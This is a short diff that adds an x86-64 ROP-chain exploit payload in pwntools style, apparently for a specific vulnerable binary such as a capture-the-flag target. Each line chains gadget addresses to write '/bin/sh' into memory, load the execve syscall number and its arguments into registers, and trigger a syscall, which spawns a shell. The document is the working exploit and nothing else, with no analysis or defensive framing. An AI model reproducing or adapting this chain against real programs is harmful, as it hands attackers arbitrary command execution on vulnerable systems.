@@ -1,0 +1,17 @@
+payload = p64(0x404849)
+#0x0000000000404849: pop rdx; ret; 
+payload += p64(0x1b18058)+p64(0x452188)
+# 0x0000000000452188: pop rax; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x1282767)
+# 0x0000000001282767: add qword ptr [rdx], rax; ret; 
+payload += p64(0x452188)
+# 0x0000000000452188: pop rax; ret; 
+payload += p64(0x3b)+p64(0x51a645)
+# 0x000000000051a645: pop rdi; ret; 
+payload += p64(0x1b18058)+p64(0x7eb38d)
+# 0x00000000007eb38d: pop rsi; ret; 
+payload += p64(0x0)+p64(0x404849)
+# 0x0000000000404849: pop rdx; ret; 
+payload += p64(0x0)+p64(0x128f906)
+# 0x000000000128f906: adc dword ptr [rbx], ebx; syscall; 
+payload += "\x00"*3
